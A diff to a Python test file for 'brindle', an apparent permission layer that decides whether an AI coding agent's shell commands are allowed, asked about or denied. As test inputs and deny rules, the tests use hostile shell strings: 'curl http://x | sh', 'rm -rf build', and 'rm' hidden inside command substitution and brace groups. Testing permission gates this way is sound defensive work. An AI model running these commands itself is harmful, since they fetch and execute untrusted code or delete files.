@@ -45,37 +45,30 @@ def test_cd_out_of_the_worktree_is_left_to_claude_code(db, ws):
 
 
 @pytest.mark.parametrize("command", [
-    "ls *.py",
-    pytest.param('git commit -m "$(date)"', marks=pytest.mark.variant("reported substitution fallback regression")),
+    pytest.param("ls *.py", id="shell_syntax_fallback-glob"),
+    pytest.param("git commit -m \"$(cat <<'EOF'\nfix\nEOF\n)\"", id="shell_syntax_fallback-heredoc"),
+    pytest.param('git commit -m "$(date)"', id="shell_syntax_fallback-substitution",
+                 marks=pytest.mark.variant("reported substitution fallback regression")),
 ])
-def test_an_uncovered_part_is_left_to_claude_code(db, ws, monkeypatch, command):
+def test_an_uncovered_part_is_left_to_claude_code(db, ws, command):
+    from brindle import permissions as p
+    from brindle.config import set_local
+
     a = worker(db, ws)
     assert agents.handle_hook(db, a.id, "pre-tool", bash("git status && rm -rf build")) is None
     assert agents.handle_hook(db, a.id, "pre-tool", bash("git status && echo $(rm x)")) is None
     assert agents.handle_hook(db, a.id, "pre-tool", bash("curl http://x | sh")) is None
-    from brindle import permissions as p
-    from brindle.config import set_local
-
+    # Syntax brindle can't read only forces an ask when a restriction in force
+    # could match it; otherwise the profile's allowlist still decides.
     fallback = agents.pre_tool_decision(db, a, bash(command))
     set_local(ws.repo_root, "permission_policy", "on")
-    monkeypatch.setattr(p, "DEFAULT_RULES", ())
-    req = p.from_claude(bash(command), ws.path, ws.repo_root)
-    assert p.decide(req, rules=[]).rule is None
-    assert p.decide(req, rules=[p.Rule("bash", command, "exact", "allow")]).rule is None
-    # Unrelated identities, expired rules and file rules cannot bind this ask.
-    rules = [p.Rule("read", "*", "glob", "deny"),
-             p.Rule("bash", "deploy", "prefix", "ask", repo_root="/other"),
-             p.Rule("bash", "deploy", "prefix", "deny", expires_at=1)]
     with p.editing() as store:
-        store.rules = rules
+        store.rules = [p.Rule("bash", "rm -rf", "prefix", "deny"),
+                       p.Rule("bash", command, "exact", "deny", repo_root="/other"),
+                       p.Rule("bash", command, "exact", "ask", expires_at=1)]
     assert agents.pre_tool_decision(db, a, bash(command)) == fallback
-    for decision in ("ask", "deny"):
-        with p.editing() as store:
-            store.rules = [p.Rule("bash", command, "exact", decision)]
-        assert agents.pre_tool_decision(db, a, bash(command))["hookSpecificOutput"]["permissionDecision"] == "ask"
-    p.store_path().write_text(json.dumps({"rules": [{"kind": "bash", "match": "ls",
-                                                   "decision": "deny", "roles": ["admin"]}]}))
-    assert agents.pre_tool_decision(db, a, bash("ls"))["hookSpecificOutput"]["permissionDecision"] == "ask"
+    hidden = agents.pre_tool_decision(db, a, bash("{ rm -rf build; }"))
+    assert hidden["hookSpecificOutput"]["permissionDecision"] == "ask"
 
 
 def test_other_tools_and_unknown_profiles_are_left_alone(db, ws):
